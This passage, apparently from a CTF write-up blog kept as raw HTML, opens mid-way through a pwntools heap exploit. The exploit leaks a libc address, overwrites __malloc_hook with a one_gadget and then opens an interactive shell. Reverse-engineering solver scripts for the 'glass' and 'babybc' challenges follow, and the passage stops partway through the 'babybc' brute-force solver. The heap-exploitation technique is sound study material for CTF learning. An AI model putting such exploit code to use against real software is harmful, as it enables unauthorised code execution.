punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x70</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'malloc_hook'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  free<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><pre class="language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x9e</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x4f</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token string">'12345678'</span>number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    number<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>c<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> b    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> number<span class="token punctuation">[</span><span class="token punctuation">(</span>b <span class="token operator">+</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><h3 id="babybc"><a href="#babybc" class="headerlink" title="babybc"></a>babybc</h3><p>用到 LLVM，再IDA打开</p><p>两个函数，写了各种限制</p><pre class="language-none"><code class="language-none">横row 0001 1000 2001 0000 1010map[0][3] &gt; map[0][4]map[1][0] &gt; map[1][1]map[2][0] &lt; map[2][1]map[2][3] &gt; map[2][4]map[4][0] &gt; map[4][1]map[4][2] &gt; map[4][3]纵col 00202 00000 00010 01001map[0][2] &gt; map[1][2]map[0][4] &gt; map[1][4]map[2][3] &lt; map[3][3]map[3][1] &lt; map[4][1]map[3][4] &lt; map[4][3]</code></pre><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python">num1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3  <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i4 <span class="token operator">&lt;=</span> i5<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i1 <span class="token operator">>=</span> i2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">>=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">>=</span> i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num3<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i3 <span class="token operator">&lt;=</span> i4 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num5<span 